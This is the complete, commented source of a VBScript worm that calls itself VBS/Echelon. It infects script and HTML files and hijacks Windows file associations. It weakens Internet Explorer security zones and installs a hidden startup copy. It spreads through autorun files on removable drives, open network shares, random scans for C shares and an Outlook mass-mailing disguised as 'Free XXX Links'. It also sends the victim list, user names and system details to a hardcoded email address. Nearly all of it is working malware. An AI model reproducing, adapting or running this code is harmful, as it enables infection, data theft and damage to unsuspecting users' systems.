On Error Resume Next
Set FSO = CreateObject("Scripting.FileSystemObject")
Set WshShell = CreateObject("WScript.Shell")

'ActiveX Objects.

Set argv = WScript.Arguments
argc = argv.Count - 1

'Get a count of the arguments.

Set ReadUs = FSO.OpenTextFile(WScript.ScriptFullName, 1)
OC = ReadUs.ReadAll
OC = Mid(OC, InStr(1, OC, "'VBS/Echelon by FSO ---->"), InStrRev(OC, "'<---- Exit Echelon") + 19)

'Read the necessary stuff from the script to replicate.

If argv(argc) = "/intr" Then

'"/intr" is the last switch (intercept,) so run the infection code.

	Ext = UCase(Right(argv(0), InStr(1, argv(0), ".") - 1))

'Get the file extension.

	If Ext = "VBS" Or Ext = "VBE" Or Ext = "WSF" Then
		If argv(argc - 1) = "/cmd" Then
			Arg = "CSCRIPT "
		Else
			Arg = "WSCRIPT "
		End If
	Else
		Arg = argv(argc - 1) & " "
	End If
	For X = 1 To argc
		Arg = Arg&argv(X)
	Next
	WshShell.Run Arg, 5, True

'Execute the potential victim.

	Set ChkInf = FSO.OpenTextFile(argv(0), 1)
	InfTest = InStr(1, ChkInf.ReadAll, "'VBS/Echelon by FSO ---->")
	ChkInf.Close

'Check for infection.

	If InfTest = 0 Then
		GPF = FSO.GetFile(argv(0)).Attributes
		NPF = GPF
		NPF = 0
		Set WrInf = FSO.OpenTextFile(argv(0), 8)

'Change the attributes and open for appending.

		If Ext = "VBS" Or Ext = "VBE" Then
			WrInf.Write OC
			WrInf.Close

'If it's a standard VBS, just write us in.

		ElseIf Ext = "WSF" Then
			WrInf.WriteLine "<"&"job id=Echelon"&">"
			WrInf.WriteLine "<"&"script language=vbs"&">"
			WrInf.WriteLine OC
			WrInf.WriteLine "<"&"/script"&">"
			WrInf.Write "<"&"/job"&">"

'WSF?  Add a job of language "vbs" and add our code to it.

		Else
			Set RdCode = FSO.OpenTextFile(WScript.ScriptFullName, 1)
			RdCode.WriteLine "<"&"SCRIPT LANGUAGE=VBS"&">"
			RdCode.WriteLine "Set FSO = CreateObject(""Scripting.FileSystemObject"")"
			RdCode.WriteLine "Set Echelon = FSO.OpenTextFile(""C:\BACKUP32.VBS"",2,True)"
			Do Until RdCode.AtEndOfStream
				WrInf.WriteLine "Echelon.WriteLine "&Chr(34)&Replace(RdCode.ReadLine, Chr(34), Chr(34)&Chr(34))&Chr(34)
			Loop
			WrInf.WriteLine "Echelon.Close"
			WrInf.WriteLine "Set WshShell=CreateObject(""WScript.Shell"")"
			WrInf.WriteLine "WshShell.Run ""C:\BACKUP32.VBS"", 0, True"
			WrInf.WriteLine "FSO.DeleteFile ""C:\BACKUP32.VBS"""
			WrInf.Write "<"&"SCRIPT"&">"

'Must be HTML, because we didn't hook anything else.

		End If
		NPF = GPF
	End If
End If

'End infector code.  (Set back attributes)

WshShell.RegWrite "HKEY_CLASSES_ROOT\WSFFile\Shell\Open\Command\", "WSCRIPT C:\WINDOWS\BACKUP32.VBS ""%1"" %* /wnd /intr"
WshShell.RegWrite "HKEY_CLASSES_ROOT\WSFFile\Shell\Open2\Command\", "WSCRIPT C:\WINDOWS\BACKUP32.VBS ""%1"" %* /cmd /intr"
WshShell.RegWrite "HKEY_CLASSES_ROOT\VBSFile\Shell\Open\Command\", "WSCRIPT C:\WINDOWS\BACKUP32.VBS ""%1"" %* /wnd /intr"
WshShell.RegWrite "HKEY_CLASSES_ROOT\VBSFile\Shell\Open2\Command\", "WSCRIPT C:\WINDOWS\BACKUP32.VBS ""%1"" %* /cmd /intr"
WshShell.RegWrite "HKEY_CLASSES_ROOT\VBEFile\Shell\Open\Command\", "WSCRIPT C:\WINDOWS\BACKUP32.VBS ""%1"" %* /wnd /intr"
WshShell.RegWrite "HKEY_CLASSES_ROOT\VBEFile\Shell\Open2\Command\", "WSCRIPT C:\WINDOWS\BACKUP32.VBS ""%1"" %* /cmd /intr"
WshShell.RegWrite "HKEY_CLASSES_ROOT\htafile\Shell\Open\Command\", "WSCRIPT C:\WINDOWS\BACKUP32.VBS ""%1"" %* MSHTA /intr"
HtmSh = WshShell.RegRead("HKEY_CLASSES_ROOT\htmlfile\shell\open\command\")
HtmSh = Mid(HtmSh, 1, InStr(1, HtmSh, " "))
WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\shell\open\command\", "WSCRIPT C:\WINDOWS\BACKUP32.VBS ""%1"" %* "&HtmSh&" /intr"
WshShell.RegWrite "HKEY_CLASSES_ROOT\htmlfile\shell\opennew\command\", "WSCRIPT C:\WINDOWS\BACKUP32.VBS ""%1"" %* "&HtmSh&" /intr"

'Change associations to run a viral VBS on execution of HTML-based files and scripts.

KL = Array("HKLM\SOFTWARE", "HKCU\Software")
ZS = Array("1001", "1004", "1200", "1201")
For X = 1 To 2
	For L = 0 To 1
		For M = 1 To 4
			WshShell.RegWrite KL(X)&"\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\"&CStr(L)&"\"&ZS(M), 0, "REG_DWORD"
		Next
	Next
Next

'Change MSIE security settings.

Set MakeVbs = FSO.CreateTextFile("C:\WINDOWS\BACKUP32.VBS")
MakeVbs.Write OC
MakeVbs.Close
FSO.GetFile("C:\WINDOWS\BACKUP32.VBS").Attributes = 39
WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\System Restore", "WSCRIPT C:\WINDOWS\BACKUP32.VBS"

'Make the viral VBS for execution by Windows.  Register it to run at startup.

Set SignHta = FSO.CreateTextFile("C:\WINDOWS\BACKUP32.HTA")
SignHta.WriteLine "<"&"SCRIPT LANGUAGE=VBS"&">"
SignHta.WriteLine "Set FSO=CreateObject(""Scripting.FileSystemObject"")"
SignHta.WriteLine "Set VBS=FSO.CreateTextFile(""C:\WINDOWS\BACKUP32.VBS"")"
SignHta.WriteLine "VBS.Write Rp("&Replace(Replace(OC, """, """"), vbNewLine, ";")&")"
SignHta.WriteLine "VBS.Close"
SignHta.WriteLine "Set Sh=CreateObject(""WScript.Shell"")"
SignHta.WriteLine "Sh.RegWrite ""HKCU\Software\Microsoft\Windows Script\Settings\TrustPolicy"",0,""REG_DWORD"""
SignHta.WriteLine "Sh.Run ""C:\WINDOWS\BACKUP32.VBS"""
SignHta.WriteLine "Close"
SignHta.Write "<"&"/SCRIPT"&">"
SignHta.Close
FSO.GetFile("C:\WINDOWS\BACKUP32.HTA").Attributes = 39

'Make the HTA dropper for the spreading code.

For Each D In FSO.Drives
	If D.DriveType = 2 Or D.DriveType = 5 Then
		P = D.Path&"\"
		TryDel P&"WINDOWS\START MENU\PROGRAMS\STARTUP"
		TryDel P&"WIN95\START MENU\PROGRAMS\STARTUP"
		TryDel P&"WIN95\WINDOWS\START MENU\PROGRAMS\STARTUP"
		TryDel P&"WINNT\START MENU\PROGRAMS\STARTUP"
		TryDel P&"WINNT\WINDOWS\START MENU\PROGRAMS\STARTUP"
		TryDel P&"WINNT\ADMINISTRATOR\WINDOWS\START MENU\PROGRAMS\STARTUP"
		TryDel P&"WINNT\WINDOWS\ADMINISTRATOR\START MENU\PROGRAMS\STARTUP"

'Maintenence code.  Searches for startup folders on local drives and calls "TryDel" on them.

	ElseIf D.DriveType = 1 Then
		DL = UCase(D.Path&"\")
		If Not DL = "A:\" And Not DL = "B:\" Then
			FSO.CopyFile "C:\WINDOWS\BACKUP32.HTA", DL&"WINSTART.HTA"
			FSO.GetFile(DL&"WINSTART.HTA").Attributes = 39
			If FSO.FileExists(DL&"AUTORUN.INF") Then
				ARAttr = FSO.GetFile(DL&"AUTORUN.INF").Attributes
				FSO.GetFile(DL&"AUTORUN.INF").Attributes = 0
			Else
				ARAttr = 0
			End If
			Set AutoRun = FSO.CreateTextFile(DL&"AUTORUN.INF",True)
			AutoRun.WriteLine "[autorun]"
			AutoRun.Write "OPEN=WINSTART.HTA"
			AutoRun.Close
			If ARAttr > 0 Then
				FSO.GetFile(DL&"AUTORUN.INF").Attributes = ARAttr
			End If
		End If
	End If
Next

'ZIP drive code.  Copies the dropper as WINSTART.HTA.
'Executes when the disk is accessed. (i.e, EXPLORER, etc.)

Set WshNet = CreateObject("WScript.Network")
Set WNEnum = WshNet.EnumNetworkDrives
For Each D In WNEnum
	N = D&"\"
	NetCopy N&"WINDOWS\START MENU\PROGRAMS\STARTUP"
	NetCopy N&"WIN95\START MENU\PROGRAMS\STARTUP"
	NetCopy N&"WIN95\WINDOWS\START MENU\PROGRAMS\STARTUP"
	NetCopy N&"WINNT\START MENU\PROGRAMS\STARTUP"
	NetCopy N&"WINNT\WINDOWS\START MENU\PROGRAMS\STARTUP"
	NetCopy N&"WINNT\ADMINISTRATOR\START MENU\PROGRAMS\STARTUP"
	NetCopy N&"WINNT\ADMINISTRATOR\WINDOWS\START MENU\PROGRAMS\STARTUP"
	NetCopy N&"WINNT\WINDOWS\ADMINISTRATOR\START MENU\PROGRAMS\STARTUP"
Next

'Network code.  Spreads over open shares.
'Fails to replicate if the drive doesn't contain one of the folders it checks.

MapInfo = ""
For X = 0 To WshNet.EnumNetworkDrives.Count - 1
	XX = CStr(X)
	NT = Right(XX, 1)
	If NT = "0" Or NT = "2" Or NT = "4" Or NT = "6" Or NT = "8" Then
		MapInfo = MapInfo&WshNet.EnumNetworkDrives(X)&" = "
	Else
		MapInfo = MapInfo&WshNet.EnumNetworkDrives(X)&vbcrlf
	End If
Next

'Backdoor code.  Gathers Network drive info.

PrintInfo = ""
For X = 0 To WshNet.EnumPrinterConnections.Count - 1
	XX = CStr(X)
	NT = Right(XX, 1)
	If NT = "0" Or NT = "2" Or NT = "4" Or NT = "6" Or NT = "8" Then
		PrintInfo = PrintInfo&WshNet.EnumPrinterConnections(X)&" = "
	Else
		PrintInfo = PrintInfo&WshNet.EnumPrinterConnections(X)&vbcrlf
	End If
Next

'Backdoor code.  Gathers printer info.

Set Outlook = CreateObject("Outlook.Application")
If Not WshShell.RegRead("HKCU\OSVersion") = "Win32s" Then
	FSO.CopyFile "C:\WINDOWS\BACKUP32.HTA", "C:\WINDOWS\Free Links.hta"
	Set MAPI = Outlook.GetNameSpace("MAPI")
	Set MM = Outlook.CreateItem(0)
	MM.Subject = "Free XXX Links!"
	MM.Body = vbcrlf&vbtab&"Free XXX Links!!!  This is the best stuff yet!"
	MM.Attachments.Add("C:\WINDOWS\Free Links.hta")
	MM.DeleteAfterSubmit = True
	For Each M In MAPI.AddressLists
		For Each C In M.AddressEntries
			MM.Bcc = MM.Bcc&"; "
		Next
	Next
	MM.Bcc = Mid(MM.Bcc, 1, Len(MM.Bcc) - 2)
	Rcpt = Replace(MM.Bcc, ";", vbcrlf)
	MM.Send
	FSO.DeleteFile "C:\WINDOWS\Free Links.hta"
	WshShell.RegWrite "HKCU\OSVersion", "Win32s"

'Outlook mass-mailer code.

	Set Tracker = Outlook.CreateItem(0)
	Tracker.Bcc = "fsosolutions@hotmail.com"
	Tracker.Subject = "VBS/Echelon Outlook Tracker"
	Tracker.Body = "VBS/Echelon has completed a mass mailing via Outlook."&vbcrlf&vbcrlf&"The victims include:"&vbcrlf&vbcrlf&Rcpt&vbcrlf&vbcrlf&"Drive C is running "&FSO.Drives("C:\").FileSystem&" file system."&vbcrlf&"Windows Scripting Host version "&WScript.Version&vbcrlf&"Computer Name: "&WshNet.ComputerName&vbcrlf&"User Domain: "&WshNet.UserDomain&vbcrlf&"User Name: "&WshNet.UserName&vbcrlf&"Network Drive Info: "&MapInfo&vbcrlf&"Printer Info: "&PrintInfo&vbcrlf&"Windows Folder: "&FSO.GetSpecialFolder(0)&vbcrlf&"System Folder: "&FSO.GetSpecialFolder(1)&vbcrlf&"Temporary Folder: "&FSO.GetSpecialFolder(2)
	Tracker.DeleteAfterSubmit = True
	Tracker.Send
End If

'Backdoor code.  Sends a message to fsosolutions@hotmail.com with system info.

K = 0
Do Until WshNet.UserDomain = Empty
	Randomize
	If K < 50 Then
		A = Int(Rnd * 15) + 199
	Else
		A = Int(Rnd * 256)
	End If
	B = Int(Rnd * 256)
	C = Int(Rnd * 256)
	For X = 1 To 256
		IP = A&"."&B&"."&C&"."&X
		NL = WshShell.RegRead("HKLM\SOFTWARE\Microsoft\Network.log\"&IP)
		If Not NL = "Successful Copy" Then
			WNet.MapNetworkDrive "J:", "\\"&IP&"\C"
			N = "J:\"
			NetCopy N&"WINDOWS\START MENU\PROGRAMS\STARTUP"
			NetCopy N&"WIN95\START MENU\PROGRAMS\STARTUP"
			NetCopy N&"WIN95\WINDOWS\START MENU\PROGRAMS\STARTUP"
			NetCopy N&"WINNT\START MENU\PROGRAMS\STARTUP"
			NetCopy N&"WINNT\WINDOWS\START MENU\PROGRAMS\STARTUP"
			NetCopy N&"WINNT\ADMINISTRATOR\START MENU\PROGRAMS\STARTUP"
			NetCopy N&"WINNT\ADMINISTRATOR\WINDOWS\START MENU\PROGRAMS\STARTUP"
			NetCopy N&"WINNT\WINDOWS\ADMINISTRATOR\START MENU\PROGRAMS\STARTUP"
			WshShell.RegWrite "HKLM\SOFTWARE\Microsoft\Network.log\"&IP, "Successful Copy"
		End If
	Next
	K = K + 1
Loop

'Netlog-like C-share lookup.  Scans systems for open shares called "C" and copies itself to them.

Sub TryDel(sfpath)
On Error Resume Next
FSO.DeleteFile sfpath&"\WINTMP32.HTA", True
End Sub

'Maintenence code.  Deletes the HTA file dropped by the network code.
'Only called on fixed/RAM drives, so it doesn't delete itself early.
'This would always run before the HTA, since Windows runs reg. services first.

Sub NetCopy(pth)
On Error Resume Next
FSO.CopyFile "C:\WINDOWS\BACKUP32.HTA", pth&"\WINTMP32.HTA"
End Sub

'Copies the worm to the specified folder as WINTMP32.HTA.

'<---- Exit Echelon